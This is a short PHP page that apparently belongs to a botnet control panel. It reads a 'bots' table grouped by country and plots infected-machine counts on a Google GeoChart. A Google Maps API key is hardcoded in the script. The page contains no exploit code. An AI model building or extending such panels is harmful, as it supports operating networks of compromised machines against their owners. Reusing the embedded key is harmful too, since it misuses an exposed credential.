<?php
include("../inc/botstats.php");
include '../inc/geo/geoip.inc';
include('../inc/geo/geo.php');
$gi = geoip_open("../inc/geo/GeoIP.dat", "");
?>

<html>
  <head>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en">
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.cyan-light_blue.min.css">
    <link rel="stylesheet" href="../dist/css/styles.css">
    
    <script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>
        <script type="text/javascript">
        google.charts.load('current', {
        'packages':['geochart', 'corechart'],
        'mapsApiKey': 'AIzaSyAmjTDuWiy-V8RbMbtk1j6SbBm_hoNftBo'
        });
        google.charts.setOnLoadCallback(drawRegionsMap);
        function drawRegionsMap() {
            var data = google.visualization.arrayToDataTable([
                ['Country', 'Bots'],
                <?php
                $csel = $odb->query("SELECT country, COUNT(*) AS cnt FROM bots GROUP BY country ORDER BY cnt");
               while ($c = $csel->fetch())
                {
                    echo '[\'' . countryCodeToCountry($c[0]) . '\',';
                    echo $c[1] . '],' . PHP_EOL;
                }
                ?>
            ]);
            var options = {};
            var chart = new google.visualization.GeoChart(document.getElementById('regions_div'));
            chart.draw(data, options);
      }
    </script>
  </head>
  <body>
    <div id="regions_div" style="width: 500px; height: 300px;"></div>
    <script src="https://code.getmdl.io/1.3.0/material.min.js"></script>
  </body>
</html>